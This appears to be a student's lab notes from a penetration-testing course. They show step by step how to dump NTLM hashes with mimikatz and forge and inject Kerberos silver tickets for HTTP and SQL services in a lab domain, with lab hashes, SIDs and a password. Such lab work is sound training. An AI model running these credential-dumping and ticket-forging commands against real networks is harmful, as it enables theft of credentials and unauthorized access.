21.4.3.1

# 21.4.3.1.1. Create and inject a silver ticket for the iis_service account.

Get the SID for user corp\offsec
`whoami /user`
![cefb2cde38b9a22842339cd09c6994f6.png](3b8b29cbf7a84411a5367ca2e6964ef7.png)

Get the NTLM hash of corp\offsec  using mimikatz
`sekurlsa::logonpasswords`
![3f3cebc361d0b92f9de35365b15c21b7.png](047637e16662439bb42122c106f787c6.png)

Purge the kerberos tickets
`kerberos::purge`

Confirm the purge 
`kerberos::list`

Create the silver ticket
`mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /target:CorpWebServer.corp.com /service:HTTP /rc4:2892D26CDF84D7A70E2EB3B9F05C425E /ptt`
![f2f11ca8616f2deab170e9241c3c7c5d.png](25056dc4cfd1492588e29cd1c83bd2f0.png)



# 21.4.3.1.2. How can creating a silver ticket with group membership in the Domain Admins group for a SQL service provide a way to gain arbitrary code execution on the associated server?

If a service is registered with a service principal name (as sql is), and that service principal name is used on multiple servers, then the silver ticket can be leveraged against them all. Remember that in Kerberos authentication, the application blindly trusts the integrity of the service ticket since it is encrypted with a password hash (which theoretically is only know to the srvice account and domain controller).



# 21.4.3.1.3. Create a silver ticket for the SQL service account.

Logon as user sql_service. We know from previous modules that its password is Qwerty09!
![839776300a20b3c5fccb00a03ff69d56.png](afe74346cb68489c844cfd3f4130efcd.png)

Run command prompt as administrator
![7238c07af7bc5a351f2888d0a4b87b05.png](d9d165f016d94bfaab16894c42c31e68.png)

Allow the app to make changes to this device
![1d74870dc5b1b54f9a8d73262cf6bffc.png](83b2a9e165694097899d380642c358a6.png)

Run powershell and ensure the Policy Restriction is Unrestricted
![c4f409e831b03bbf65290921531d4934.png](0487f3da372b44f89a442c942e2b59d4.png)

Run mimikatz, check debug privileges, and check logon passwords. We see that for user corp\sql_user, the ntlm hash is: e2b475c11da2a0748290d87aa966c327
`.\mimikatz.exe`
`privilege::debug`
`sekurlsa::logonpasswords`
![b3f6945d9949bda1ac9ba90cee6ec2ab.png](69ef2891522c421a9959c6cb85b155cf.png)

We already know from 21.2.5.2.2 that the serviceprincipalname for the sql account = MSSQLSvc/CorpSqlServer.corp.com:1433. Create the silver ticket using this info.
`mimikatz # kerberos::golden /user:sql_service /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /target:CorpSqlServer.corp.com:1433 /service:MSSQLSvc /rc4:e2b475c11da2a0748290d87aa966c327 /ptt`
![2293509a2098710bea04d3bca1b42d5c.png](08377052b5804a008e56447db8ea8282.png)
